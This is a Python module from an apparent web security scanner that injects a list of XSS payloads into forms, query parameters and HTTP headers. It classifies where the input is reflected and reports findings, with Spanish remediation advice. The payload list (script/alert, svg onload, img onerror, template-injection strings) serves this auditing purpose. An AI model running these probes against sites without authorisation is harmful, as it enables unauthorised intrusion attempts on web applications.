# Modulo de escaneo y analisis para xss.

from bs4 import BeautifulSoup
import logging
import re
import html as _html_mod
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from scanner.http_client import HttpClient
from scanner.forms import extract_forms_from_html


logger = logging.getLogger(__name__)



XSS_MARKER = "bh_xss_9r4k"


_EVENT_ATTRS = re.compile(
    r'\b(on(?:load|error|click|mouse\w+|focus|blur|input|change|submit|key\w+|'
    r'drag\w*|drop|resize|scroll|unload|beforeunload|message|popstate|'
    r'hashchange|storage|animat\w+|transit\w+|pointer\w+|touch\w+))\s*=',
    re.IGNORECASE,
)


def _reflection_context(response_html: str, marker: str) -> str:
    """
    Determine the rendering context in which *marker* appears in *response_html*.

    Returns one of:
        'script'      – inside a <script> block (almost always exploitable)
        'event'       – inside an event-handler attribute (onclick=, onerror=, …)
        'href_js'     – inside href="javascript:…"
        'attribute'   – reflected raw (unencoded) inside an HTML attribute value
        'text'        – reflected raw in page text (may be exploitable)
        'encoded'     – marker present only in HTML-entity-encoded form (safe)
        'absent'      – marker not found at all
    """
    if not marker or not response_html:
        return "absent"

    lower_html = response_html.lower()
    lower_marker = marker.lower()


    if lower_marker not in lower_html:
        encoded = _html_mod.escape(marker, quote=True).lower()
        if encoded in lower_html:
            return "encoded"
        return "absent"

    try:
        soup = BeautifulSoup(response_html, "html.parser")
    except Exception:

        return "text"


    for script in soup.find_all("script"):
        src = script.get("src") or ""
        content = (script.string or "")
        if lower_marker in content.lower() or lower_marker in src.lower():
            return "script"


    for tag in soup.find_all(True):
        for attr, val in (tag.attrs or {}).items():
            val_str = " ".join(val) if isinstance(val, list) else str(val or "")
            if lower_marker not in val_str.lower():
                continue

            if _EVENT_ATTRS.match(attr + "="):
                return "event"

            if attr.lower() in ("href", "action", "src", "formaction", "data"):
                if "javascript:" in val_str.lower():
                    return "href_js"

            return "attribute"


    body_text = soup.get_text()
    if lower_marker in body_text.lower():
        return "text"


    return "encoded"


def _severity_for_context(context: str) -> tuple[str, str]:
    """Return (severity, status) for a given reflection context."""
    if context in ("script", "event", "href_js"):
        return "Alta", "Hallazgo"
    if context == "attribute":
        return "Alta", "Posible hallazgo"
    if context == "text":
        return "Media", "Posible hallazgo"

    return "Informativa", "No evidenciado"


def _is_exploitable_context(context: str) -> bool:
    return context in ("script", "event", "href_js", "attribute", "text")

XSS_PAYLOADS = [

    f'"><{XSS_MARKER}>',
    f"'><{XSS_MARKER}>",
    f"<{XSS_MARKER}>",

    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",

    "<ScRiPt>alert(1)</sCrIpT>",
    "<script/x>alert(1)</script>",

    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",

    '" onmouseover="alert(1)',
    "' onfocus='alert(1)' autofocus='",

    "javascript:alert(1)",

    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",

    f'<img src=x onerror="/*{XSS_MARKER}_blind*/">',
]


REFLECTIVE_HEADERS = [
    ("Referer",    f"<{XSS_MARKER}>"),
    ("X-Forwarded-For", f"<{XSS_MARKER}>"),
    ("User-Agent", f"<{XSS_MARKER}>"),
]


def submit_form(client, form, payload):
    data = {}

    for field in form["fields"]:
        name = field["name"]
        field_type = field["type"]

        if field_type in ["submit", "button", "reset", "file"]:
            continue

        if field_type == "hidden":
            data[name] = field["value"]
        else:
            data[name] = payload

    if form["method"] == "POST":
        return client.post(form["action"], data=data)

    return client.get(form["action"], params=data)


def test_query_params(client, url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return None

    mutated = {k: payload for k in params.keys()}
    new_query = urlencode(mutated, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))

    return client.get(test_url)


def scan_reflected_xss_pages(pages, max_payloads=None):
    client = HttpClient()
    results = []
    payloads = XSS_PAYLOADS

    if max_payloads is not None:
        payloads = payloads[:max_payloads]

    for page in pages:
        page_url  = page.get("url") or page.get("final_url") or ""
        page_html = page.get("html") or page.get("rendered_html") or ""
        if not page_url:
            continue
        forms = extract_forms_from_html(page_url, page_html)

        for form in forms:
            for payload in payloads:
                try:
                    response = submit_form(client, form, payload)
                    if not response:
                        continue

                    resp_text = response.text or ""



                    check_token = XSS_MARKER if XSS_MARKER in payload else payload
                    context = _reflection_context(resp_text, check_token)

                    if _is_exploitable_context(context):
                        severity, status = _severity_for_context(context)
                        results.append({
                            "control": f"XSS reflejado - formulario {form['index']}",
                            "status": status,
                            "severity": severity,
                            "description": (
                                f"Entrada reflejada en contexto '{context}' sin neutralización efectiva. "
                                "La codificación HTML de entidades NO estaba presente."
                            ),
                            "evidence": (
                                f"URL: {form['action']} | Payload: {payload} | "
                                f"Contexto de reflejo: {context}"
                            ),
                            "recommendation": (
                                "Aplicar codificación de salida contextual (HTML, JS, URL según contexto), "
                                "sanitización server-side y CSP restrictiva con nonce/hash."
                            ),
                        })
                        break


                    if XSS_MARKER in resp_text and XSS_MARKER not in payload:
                        results.append({
                            "control": f"XSS potencialmente almacenado - formulario {form['index']}",
                            "status": "Posible hallazgo",
                            "severity": "Alta",
                            "description": (
                                "Marcador de auditoría presente en respuesta tras enviar payload distinto. "
                                "Puede ser XSS almacenado si el marcador persiste en otra URL."
                            ),
                            "evidence": f"URL: {form['action']} | Marcador: {XSS_MARKER}",
                            "recommendation": (
                                "Verificar si el marcador aparece en otras rutas del sitio. "
                                "Si persiste, es XSS almacenado confirmado."
                            ),
                        })
                        break

                except Exception as exc:
                    logger.debug("Error en prueba XSS formulario", exc_info=True)


        for payload in payloads:
            try:
                response = test_query_params(client, page_url, payload)
                if not response:
                    continue
                resp_text = response.text or ""
                check_token = XSS_MARKER if XSS_MARKER in payload else payload
                context = _reflection_context(resp_text, check_token)
                if _is_exploitable_context(context):
                    severity, status = _severity_for_context(context)
                    results.append({
                        "control": "XSS reflejado - parámetro GET",
                        "status": status,
                        "severity": severity,
                        "description": (
                            f"Parámetro GET reflejado en contexto '{context}' sin codificación efectiva."
                        ),
                        "evidence": (
                            f"URL: {page_url} | Payload: {payload} | "
                            f"Contexto: {context}"
                        ),
                        "recommendation": (
                            "Codificar salida según contexto, validar parámetros y aplicar CSP."
                        ),
                    })
                    break
            except Exception:
                logger.debug("Fallo en prueba XSS GET", exc_info=True)


        for header_name, header_payload in REFLECTIVE_HEADERS:
            try:
                response = client.get(page_url, headers={header_name: header_payload})
                resp_text = response.text or ""
                context = _reflection_context(resp_text, XSS_MARKER)
                if _is_exploitable_context(context):
                    severity, status = _severity_for_context(context)
                    results.append({
                        "control": f"XSS por cabecera HTTP: {header_name}",
                        "status": status,
                        "severity": severity,
                        "description": (
                            f"Valor de la cabecera {header_name} reflejado en contexto '{context}' "
                            "sin codificación efectiva."
                        ),
                        "evidence": (
                            f"URL: {page_url} | Cabecera: {header_name} | "
                            f"Contexto: {context}"
                        ),
                        "recommendation": (
                            "No reflejar cabeceras HTTP en respuestas. "
                            "Aplicar codificación contextual si es inevitable."
                        ),
                    })
            except Exception:
                logger.debug("Fallo en prueba XSS cabeceras", exc_info=True)

    if not results:
        results.append({
            "control": "XSS reflejado",
            "status": "No evidenciado",
            "severity": "Informativa",
            "description": (
                "No se detectó reflejo explotable de payloads controlados en ningún contexto HTML/JS. "
                "Las reflexiones encontradas estaban correctamente codificadas como entidades HTML."
            ),
            "evidence": "Sin reflejo en contexto peligroso identificado.",
            "recommendation": "Complementar con pruebas autenticadas, DOM XSS dinámico y revisión manual."
        })

    return results
